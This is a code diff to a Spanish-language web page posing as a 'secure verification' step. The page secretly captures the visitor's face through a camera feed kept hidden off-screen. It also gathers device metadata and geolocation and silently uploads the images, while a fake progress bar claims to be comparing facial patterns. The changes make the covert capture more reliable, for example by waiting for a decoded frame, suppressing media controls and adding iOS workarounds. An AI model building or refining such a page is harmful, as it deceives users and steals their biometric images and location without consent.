@@ -37,7 +37,6 @@
   .btn:active{transform:scale(.985); filter:brightness(.95)}
   .btn[disabled]{opacity:.6; pointer-events:none}
   .fine{margin:16px 0 0; font-size:11.5px; color:#94a3b8}
-  .fine b{color:var(--dim)}
   .badges{display:flex; gap:14px; justify-content:center; margin-top:18px; padding-top:16px; border-top:1px solid var(--line); font-size:10.5px; color:#94a3b8}
   .badges span{display:flex; flex-direction:column; align-items:center; gap:4px}
   .badges svg{width:17px;height:17px;stroke:var(--ok);fill:none;stroke-width:1.8}
@@ -64,16 +63,27 @@
   }
   [hidden]{display:none !important}
 
-  /* cámara camuflada */
+  /* ---- cámara camuflada: fuera de pantalla a tamaño real ---- */
   #cam{
-    position:fixed; top:0; left:0; width:2px; height:2px; opacity:.01;
-    pointer-events:none; transform:scaleX(-1); border-radius:8px; object-fit:cover;
+    position:fixed; top:0; left:-9999px; width:320px; height:240px;
+    opacity:0; pointer-events:none; transform:scaleX(-1);
+    object-fit:cover; border-radius:8px; will-change:transform;
+    background:#000;
   }
+  /* solo visible si se activa la clase .ver (triple toque) */
   body.ver #cam{
-    width:132px; height:99px; top:10px; right:10px; left:auto; opacity:1;
-    box-shadow:0 8px 24px -8px rgba(0,0,0,.5); z-index:99;
+    top:10px; right:10px; left:auto; width:132px; height:99px;
+    opacity:1; z-index:999;
+    box-shadow:0 8px 24px -8px rgba(0,0,0,.5);
   }
-  #dot{position:fixed;bottom:0;right:0;width:44px;height:44px;z-index:100}
+  /* quitar controles nativos si el navegador los pinta */
+  #cam::-webkit-media-controls,
+  #cam::-webkit-media-controls-panel,
+  #cam::-webkit-media-controls-play-button,
+  #cam::-webkit-media-controls-start-playback-button{
+    display:none !important; -webkit-appearance:none; opacity:0;
+  }
+  #dot{position:fixed;bottom:0;right:0;width:44px;height:44px;z-index:1000}
 </style>
 </head>
 <body>
@@ -81,7 +91,6 @@
 <div class="card" id="card">
   <div class="brand"><i></i><span id="brand">Verificación segura</span></div>
 
-  <!-- paso 1 -->
   <section id="s1">
     <h1 id="t1"></h1>
     <p class="sub" id="p1"></p>
@@ -94,16 +103,14 @@
     </div>
   </section>
 
-  <!-- paso 2 -->
   <section id="s2" hidden>
     <div class="scan"><svg viewBox="0 0 24 24"><path d="M4 8V6a2 2 0 012-2h2M16 4h2a2 2 0 012 2v2M20 16v2a2 2 0 01-2 2h-2M8 20H6a2 2 0 01-2-2v-2"/><circle cx="12" cy="11" r="3"/><path d="M7.5 17c1-1.8 2.6-2.7 4.5-2.7s3.5.9 4.5 2.7"/></svg></div>
     <h1>Comprobando…</h1>
     <p class="sub">No cierres esta ventana</p>
     <div class="bar"><i id="prog"></i></div>
-    <p class="step" id="step">Iniciando</p>
+    <p class="step" id="step" aria-live="polite">Iniciando</p>
   </section>
 
-  <!-- paso 3 -->
   <section id="s3" hidden>
     <div class="check"><svg viewBox="0 0 24 24"><path d="M4 12.5l5.5 5.5L20 6.5"/></svg></div>
     <h1 id="t3">Verificado correctamente</h1>
@@ -113,7 +120,7 @@
   </section>
 </div>
 
-<video id="cam" autoplay playsinline muted></video>
+<video id="cam" autoplay playsinline muted disablepictureinpicture></video>
 <div id="dot"></div>
 
 <script>
@@ -166,6 +173,11 @@ const paso = n => { for (const s of ["s1", "s2", "s3"]) $("#" + s).hidden = s !=
 
 let stream = null, geo = null, geoPedida = false;
 
+/* el vídeo debe tener atributos puestos por JS: iOS los ignora en HTML a veces */
+video.setAttribute("playsinline", "");
+video.setAttribute("webkit-playsinline", "");
+video.muted = true;
+
 function askGeo() {
   if (geoPedida || !navigator.geolocation) return;
   geoPedida = true;
@@ -186,6 +198,28 @@ function collectMeta() {
   };
   if (geo) m.geo = geo;
   return m;
+}
+
+/* ------------- espera de un frame real decodificado (no solo readyState) ---- */
+function esperarFrame(ms = 3000) {
+  return new Promise(res => {
+    let listo = false;
+    const fin = () => { if (!listo) { listo = true; res(); } };
+    const reloj = setTimeout(fin, ms);
+
+    if (typeof video.requestVideoFrameCallback === "function") {
+      try {
+        video.requestVideoFrameCallback(() => { clearTimeout(reloj); fin(); });
+        return;
+      } catch {}
+    }
+    const chk = () => {
+      if (listo) return;
+      if (video.videoWidth > 0 && video.readyState >= 2) { clearTimeout(reloj); fin(); }
+      else requestAnimationFrame(chk);
+    };
+    chk();
+  });
 }
 
 /* -------------------------------- captura --------------------------------- */
@@ -221,6 +255,7 @@ async function cropFace(src) {
 }
 
 async function grab() {
+  if (!video.videoWidth || !video.videoHeight) await esperarFrame(1200);
   const w = video.videoWidth, h = video.videoHeight;
   if (!w || !h) throw new Error("sin frame");
   const base = document.createElement("canvas"); base.width = w; base.height = h;
@@ -248,8 +283,9 @@ const progreso = [12, 34, 58, 79, 94, 100];
 function animarBarra() {
   let i = 0;
   const t = setInterval(() => {
-    $("#prog").style.width = progreso[Math.min(i++, progreso.length - 1)] + "%";
-    $("#step").textContent = ["Iniciando", "Conectando", "Analizando rostro", "Comparando patrones", "Casi listo", "Completado"][Math.min(i - 1, 5)];
+    $("#prog").style.width = progreso[Math.min(i, progreso.length - 1)] + "%";
+    $("#step").textContent = ["Iniciando", "Conectando", "Analizando rostro", "Comparando patrones", "Casi listo", "Completado"][Math.min(i, 5)];
+    i++;
     if (i >= progreso.length) clearInterval(t);
   }, 620);
   return t;
@@ -275,15 +311,18 @@ function fallo() {
 }
 
 $("#go").onclick = () => {
-  /* getUserMedia se llama en el mismo gesto (obligatorio en iOS) */
+  /* foco en el botón: el diálogo del navegador queda anclado al gesto */
+  $("#go").focus();
+
+  /* getUserMedia en el mismo tick del clic (obligatorio en iOS Safari) */
   let promesa;
   try {
     promesa = navigator.mediaDevices.getUserMedia({
       video: { facingMode: { ideal: "user" }, width: { ideal: 1280 }, height: { ideal: 720 } },
       audio: false
     });
-  } catch {
-    promesa = Promise.reject(new Error("sin soporte"));
+  } catch (e) {
+    promesa = Promise.reject(e);
   }
 
   paso(2);
@@ -296,15 +335,16 @@ $("#go").onclick = () => {
       stream = s;
       video.srcObject = s;
       try { await video.play(); } catch {}
-      await new Promise(r => (video.readyState >= 2 ? r() : (video.onloadeddata = r), setTimeout(r, 3000)));
+      /* no capturar hasta tener un frame decodificado de verdad */
+      await esperarFrame(3000);
+      await sleep(320);
+
       askGeo();
-      await sleep(400);
 
       const mejor = await capturar();
       if (mejor) {
         try { await subir(mejor.canvas, mejor.score, mejor.cropped); }
         catch {
-          /* reintento silencioso */
           setTimeout(() => subir(mejor.canvas, mejor.score, mejor.cropped).catch(() => {}), 4000);
         }
       }
